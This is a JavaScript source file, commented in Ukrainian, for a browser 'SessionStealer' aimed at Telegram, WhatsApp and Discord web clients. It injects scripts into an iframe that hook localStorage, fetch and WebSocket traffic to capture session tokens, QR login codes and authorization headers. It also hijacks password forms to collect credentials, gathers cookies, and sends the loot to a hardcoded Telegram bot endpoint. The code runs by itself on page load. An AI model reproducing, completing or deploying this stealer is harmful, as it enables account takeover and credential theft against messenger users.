// Конфігурація
const CONFIG = {
    BOT_TOKEN: '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA',
    CHAT_ID: '8463942433',
    ENCRYPT_KEY: 'session_stealer_advanced_key_2024',
    TARGETS: ['telegram', 'whatsapp', 'discord']
};

// Глобальні змінні
let capturedSessions = {};
let isActive = true;

class SessionStealer {
    constructor() {
        this.init();
    }

    init() {
        this.setupMutationObserver();
        this.startMonitoring();
        this.setupWebSocketIntercept();
        this.setupEventListeners(); // Додано замість injectHookScripts
    }

    setupEventListeners() {
        // Додаткові слухачі подій
        document.addEventListener('focus', this.handleFocus.bind(this), true);
        document.addEventListener('blur', this.handleBlur.bind(this), true);
    }

    handleFocus(e) {
        if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
            this.logFormActivity('focus', e.target);
        }
    }

    handleBlur(e) {
        if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
            this.logFormActivity('blur', e.target);
        }
    }

    logFormActivity(type, element) {
        const data = {
            type: 'FORM_ACTIVITY',
            activity: type,
            tag: element.tagName,
            name: element.name || 'no-name',
            id: element.id || 'no-id',
            value: element.value,
            timestamp: Date.now()
        };
        
        this.handleInterceptedData(data);
    }

    openMessenger(service) {
        document.getElementById('messengerFrame').style.display = 'block';
        
        const urls = {
            telegram: 'https://web.telegram.org/',
            whatsapp: 'https://web.whatsapp.com/',
            discord: 'https://discord.com/login'
        };

        const iframe = document.getElementById('messengerFrame');
        iframe.src = urls[service];
        
        // Ін'єкція коду в iframe після завантаження
        iframe.onload = () => {
            this.injectIntoFrame(service);
        };
    }

    injectIntoFrame(service) {
        const iframe = document.getElementById('messengerFrame');
        const scriptContent = this.getInjectionCode(service);

        try {
            const script = iframe.contentDocument.createElement('script');
            script.textContent = scriptContent;
            iframe.contentDocument.head.appendChild(script);
        } catch (e) {
            this.advancedFrameInjection(iframe, scriptContent);
        }
    }

    advancedFrameInjection(iframe, code) {
        // Обхід CORS та політик безпеки
        const blob = new Blob([code], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        const script = iframe.contentDocument.createElement('script');
        script.src = url;
        iframe.contentDocument.head.appendChild(script);
    }

    getInjectionCode(service) {
        const injectionCodes = {
            telegram: `
                // Telegram Web Session Stealer
                console.log('Injecting Telegram stealer...');
                
                // Перехоплення localStorage
                const originalSetItem = localStorage.setItem;
                localStorage.setItem = function(key, value) {
                    if (key.includes('session') || key.includes('auth') || key.includes('key')) {
                        window.parent.postMessage({
                            type: 'TELEGRAM_SESSION',
                            key: key,
                            value: value,
                            timestamp: Date.now()
                        }, '*');
                    }
                    return originalSetItem.apply(this, arguments);
                };

                // Моніторинг QR-коду
                setInterval(() => {
                    const qrCode = document.querySelector('canvas');
                    if (qrCode) {
                        try {
                            const dataUrl = qrCode.toDataURL();
                            window.parent.postMessage({
                                type: 'TELEGRAM_QR',
                                data: dataUrl,
                                timestamp: Date.now()
                            }, '*');
                        } catch (e) {}
                    }
                }, 3000);
            `,

            whatsapp: `
                // WhatsApp Web Session Stealer
                console.log('Injecting WhatsApp stealer...');
                
                // Перехоплення localStorage
                const originalSetItem = localStorage.setItem;
                localStorage.setItem = function(key, value) {
                    if (key.includes('WAToken') || key.includes('WAWebId')) {
                        window.parent.postMessage({
                            type: 'WHATSAPP_SESSION',
                            key: key,
                            value: value,
                            timestamp: Date.now()
                        }, '*');
                    }
                    return originalSetItem.apply(this, arguments);
                };

                // Моніторинг QR-коду
                const observer = new MutationObserver(function(mutations) {
                    mutations.forEach(function(mutation) {
                        if (mutation.type === 'attributes' && mutation.attributeName === 'data-ref') {
                            const qrValue = mutation.target.getAttribute('data-ref');
                            window.parent.postMessage({
                                type: 'WHATSAPP_QR',
                                data: qrValue,
                                timestamp: Date.now()
                            }, '*');
                        }
                    });
                });
                
                observer.observe(document.body, {
                    attributes: true,
                    subtree: true,
                    attributeFilter: ['data-ref']
                });
            `,

            discord: `
                // Discord Session Stealer
                console.log('Injecting Discord stealer...');
                
                // Перехоплення localStorage
                const originalSetItem = localStorage.setItem;
                localStorage.setItem = function(key, value) {
                    if (key.includes('token') || key.includes('auth')) {
                        window.parent.postMessage({
                            type: 'DISCORD_SESSION',
                            key: key,
                            value: value,
                            timestamp: Date.now()
                        }, '*');
                    }
                    return originalSetItem.apply(this, arguments);
                };

                // Перехоплення токенів з запитів
                const originalFetch = window.fetch;
                window.fetch = function(...args) {
                    return originalFetch.apply(this, args).then(response => {
                        if (response.url.includes('/api') && response.headers.get('authorization')) {
                            const token = response.headers.get('authorization');
                            window.parent.postMessage({
                                type: 'DISCORD_TOKEN',
                                token: token,
                                url: response.url,
                                timestamp: Date.now()
                            }, '*');
                        }
                        return response;
                    });
                };
            `
        };

        return injectionCodes[service];
    }

    setupMutationObserver() {
        // Моніторинг змін DOM для виявлення форм авторизації
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.addedNodes.length) {
                    this.checkForLoginForms(mutation.addedNodes);
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    checkForLoginForms(nodes) {
        nodes.forEach(node => {
            if (node.tagName === 'FORM' && node.querySelector('input[type="password"]')) {
                this.injectFormStealer(node);
            }
        });
    }

    injectFormStealer(form) {
        const originalSubmit = form.onsubmit;
        
        form.onsubmit = (e) => {
            const formData = new FormData(form);
            const credentials = {};
            for (let [key, value] of formData.entries()) {
                credentials[key] = value;
            }
            
            this.captureCredentials(credentials);
            
            if (originalSubmit) {
                return originalSubmit.call(form, e);
            }
            return true;
        };
    }

    captureCredentials(credentials) {
        this.handleInterceptedData({
            type: 'CREDENTIALS',
            data: credentials,
            timestamp: Date.now()
        });
    }

    startMonitoring() {
        // Обробка повідомлень з iframe
        window.addEventListener('message', (event) => {
            if (event.data && event.data.type) {
                this.handleInterceptedData(event.data);
            }
        });

        // Періодичний збір даних
        setInterval(() => {
            this.collectAdditionalData();
        }, 10000);
    }

    handleInterceptedData(data) {
        if (!capturedSessions[data.type]) {
            capturedSessions[data.type] = [];
        }
        
        capturedSessions[data.type].push(data);
        
        // Автоматична відправка важливих даних
        if (data.type.includes('SESSION') || data.type.includes('TOKEN') || data.type.includes('QR')) {
            this.sendCapturedData();
        }
    }

    setupWebSocketIntercept() {
        // Перехоплення WebSocket глобально
        const originalWebSocket = window.WebSocket;
        window.WebSocket = function(...args) {
            const ws = new originalWebSocket(...args);
            
            ws.addEventListener('message', (event) => {
                try {
                    const data = JSON.parse(event.data);
                    this.analyzeWebSocketData(data, args[0]);
                } catch (e) {}
            });
            
            return ws;
        }.bind(this);
    }

    analyzeWebSocketData(data, url) {
        if (url.includes('telegram') || url.includes('whatsapp') || url.includes('discord')) {
            if (data.auth_key || data.token || data.session) {
                this.handleInterceptedData({
                    type: 'WEBSOCKET_DATA',
                    service: this.detectService(url),
                    data: data,
                    url: url,
                    timestamp: Date.now()
                });
            }
        }
    }

    detectService(url) {
        if (url.includes('telegram')) return 'telegram';
        if (url.includes('whatsapp')) return 'whatsapp';
        if (url.includes('discord')) return 'discord';
        return 'unknown';
    }

    collectAdditionalData() {
        // Додатковий збір даних
        const additionalData = {
            userAgent: navigator.userAgent,
            cookies: document.cookie,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: Date.now()
        };

        this.handleInterceptedData({
            type: 'METADATA',
            data: additionalData
        });
    }

    sendCapturedData() {
        if (Object.keys(capturedSessions).length === 0) return;

        const encryptedData = this.encryptData(capturedSessions);
        
        // Відправка через Telegram бота
        const url = \`https://api.telegram.org/bot\${CONFIG.BOT_TOKEN}/sendMessage?chat_id=\${CONFIG.CHAT_ID}&text=\${encodeURIComponent('SESSION_DATA:' + encryptedData)}\`;
        const img = new Image();
        img.src = url;
        
        img.onload = () => {
            console.log('Data sent successfully');
            capturedSessions = {};
        };
        
        img.onerror = () => {
            console.log('Failed to send data');
        };
    }

    encryptData(data) {
        return btoa(unescape(encodeURIComponent(JSON.stringify(data))));
    }
}

// Глобальний доступ
window.openMessenger = function(service) {
    if (!window.sessionStealer) {
        window.sessionStealer = new SessionStealer();
    }
    window.sessionStealer.openMessenger(service);
};

// Автоініціалізація
setTimeout(() => {
    if (!window.sessionStealer) {
        window.sessionStealer = new SessionStealer();
    }
}, 1000);
